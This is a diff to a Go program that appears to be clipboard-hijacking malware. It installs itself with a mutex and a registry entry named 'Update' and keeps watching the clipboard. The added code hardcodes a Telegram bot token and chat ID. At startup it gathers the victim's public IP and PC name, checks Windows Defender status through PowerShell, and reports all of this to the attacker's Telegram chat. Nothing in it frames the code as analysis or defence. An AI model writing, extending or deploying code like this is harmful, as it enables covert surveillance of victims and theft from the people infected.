@@ -1,6 +1,12 @@
 package main
 
 import (
+	"bytes"
+	"encoding/json"
+	"io/ioutil"
+	"net/http"
+	"os/exec"
+	"strings"
 	"fmt"
 	"os"
 	"regexp"
@@ -19,6 +25,8 @@ const (
 	fileName         = "Update"
 	mutexName        = "Global\\qerhbfnuqeurtrbdtbqehvfrq"
 	registryName     = "Update"
+	telegramBotToken = "7355349065:AAHqBgsstpFc6ZVHBUcRGXNVzP19TaQst5E" 	// Telegram Bot Token
+	chatID           = "7275089328"     									// Telrgam Chat ID
 	clipboardFreq    = 500 * time.Millisecond
 	inactivityTimeout = 15 * time.Minute
 	mouseCheckFreq   = 1 * time.Second
@@ -58,6 +66,28 @@ func main() {
 	).Title(executableName).Error()
 
 	installSelf()
+	
+	ip := getPublicIP()
+	pcName := getPCName()
+	antivirusStatus := isAntivirusEnabled()
+
+	message := fmt.Sprintf(
+		"*System Information*\n"+
+			"--------------------\n"+
+			"*📡 Public IP :* `%s`\n"+
+			"*💻 PC Name :* `%s`\n"+
+			"*🛡 Antivirus Status :* `%s`\n"+
+			"--------------------",
+		ip, pcName, antivirusStatus,
+	)
+
+	err := sendMessageToTelegram(message)
+	if err != nil {
+		fmt.Println("Failed to send message to Telegram:", err)
+	} else {
+		fmt.Println("Message sent successfully!")
+	}
+
 	monitorClipboard()
 }
 
@@ -152,4 +182,64 @@ func processClipboardText(text string) {
 			}
 		}
 	}
+}
+
+
+func getPublicIP() string {
+	resp, err := http.Get("https://api.ipify.org?format=text")
+	if err != nil {
+		return "Unknown"
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "Unknown"
+	}
+
+	return strings.TrimSpace(string(body))
+}
+
+func getPCName() string {
+	name, err := os.Hostname()
+	if err != nil {
+		return "Unknown"
+	}
+	return name
+}
+
+func isAntivirusEnabled() string {
+	cmd := exec.Command("powershell", "Get-MpComputerStatus | Select-Object -ExpandProperty AMServiceEnabled")
+	output, err := cmd.Output()
+	if err != nil {
+		return "Unknown"
+	}
+	status := strings.TrimSpace(string(output))
+	if status == "True" {
+		return "Enabled"
+	} else if status == "False" {
+		return "Disabled"
+	}
+	return "Unknown"
+}
+
+func sendMessageToTelegram(message string) error {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
+	data := map[string]string{
+		"chat_id":    chatID,
+		"text":       message,
+		"parse_mode": "Markdown", 
+	}
+	jsonData, _ := json.Marshal(data)
+
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("failed to send message: %s", resp.Status)
+	}
+	return nil
 }
